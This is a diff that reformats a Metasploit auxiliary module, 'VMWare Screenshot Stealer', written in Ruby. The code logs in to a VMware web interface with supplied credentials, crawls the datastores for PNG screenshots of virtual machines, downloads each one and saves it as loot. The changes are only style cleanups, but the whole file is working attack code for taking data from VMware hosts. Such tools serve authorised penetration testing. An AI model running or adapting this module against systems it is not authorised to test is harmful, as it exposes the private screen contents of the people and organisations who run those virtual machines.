@@ -1,14 +1,12 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::VIMSoap
@@ -17,11 +15,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name'           => 'VMWare Screenshot Stealer',
-      'Description'    => %Q{
+      'Description'    => %(
         This module uses supplied login credentials to connect to VMWare via
         the web interface. It then searches through the datastores looking for screenshots.
         It will downlaod any screenshots it finds and save them as loot.
-      },
+      ),
       'Author'         => ['theLightCosine'],
       'License'        => MSF_LICENSE
     )
@@ -31,9 +29,10 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(443),
         OptString.new('USERNAME', [ true, "The username to Authenticate with.", 'root' ]),
         OptString.new('PASSWORD', [ true, "The password to Authenticate with.", 'password' ])
-      ], self.class)
+      ], self.class
+    )
 
-    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true]),])
+    register_advanced_options([OptBool.new('SSL', [ false, 'Negotiate SSL for outgoing connections', true])])
   end
 
   def run_host(ip)
@@ -42,31 +41,29 @@ class MetasploitModule < Msf::Auxiliary
       crawl_page('/folder')
     else
       print_error "Login Failure on #{ip}"
-      return
+      nil
     end
   end
 
-
-
-  def crawl_page(path, parent='')
+  def crawl_page(path, parent = '')
     res = send_request_cgi({
-      'uri'     => path,
-      'method'  => 'GET',
-      'cookie'  => @vim_cookie,
-      'headers' => { 'Authorization' => "Basic #{@user_pass}"}
-    }, 25)
+                             'uri'     => path,
+                             'method'  => 'GET',
+                             'cookie'  => @vim_cookie,
+                             'headers' => { 'Authorization' => "Basic #{@user_pass}" }
+                           }, 25)
     if res
       @vim_cookie = res.get_cookies
-      if res.code== 200
+      if res.code == 200
         res.body.scan(/<a href="([\w\/\?=&;%]+)">/) do |match|
           link = match[0]
           link.gsub!('&amp;', '&')
           case link
           when /%2epng?/
-            img_name = Rex::Text::uri_decode(link.match(/\/([\w\?=&;%]+%2epng)/)[1])
+            img_name = Rex::Text.uri_decode(link.match(/\/([\w\?=&;%]+%2epng)/)[1])
             print_good "Screenshot Found: #{img_name} Full Path: #{link}"
             grab_screenshot(link, img_name)
-          when  /%2e(?!png)/
+          when /%2e(?!png)/
             next
           when parent
             next
@@ -82,16 +79,16 @@ class MetasploitModule < Msf::Auxiliary
 
   def grab_screenshot(path, name)
     res = send_request_cgi({
-      'uri'     => path,
-      'method'  => 'GET',
-      'cookie'  => @vim_cookie,
-      'headers' => { 'Authorization' => "Basic #{@user_pass}"}
-    }, 25)
+                             'uri'     => path,
+                             'method'  => 'GET',
+                             'cookie'  => @vim_cookie,
+                             'headers' => { 'Authorization' => "Basic #{@user_pass}" }
+                           }, 25)
     if res
       @vim_cookie = res.get_cookies
       if res.code == 200
         img = res.body
-        ss_path = store_loot("host.vmware.screenshot", "image/png", datastore['RHOST'], img, name , "Screenshot of VM #{name}")
+        ss_path = store_loot("host.vmware.screenshot", "image/png", datastore['RHOST'], img, name, "Screenshot of VM #{name}")
         print_status "Screenshot saved to #{ss_path}"
       else
         print_error "Failed to retrieve screenshot at #{path} HTTP Response code #{res.code} "
@@ -99,7 +96,5 @@ class MetasploitModule < Msf::Auxiliary
     else
       print_error "Failed to retrieve screenshot: there was no reply"
     end
-
   end
-
 end
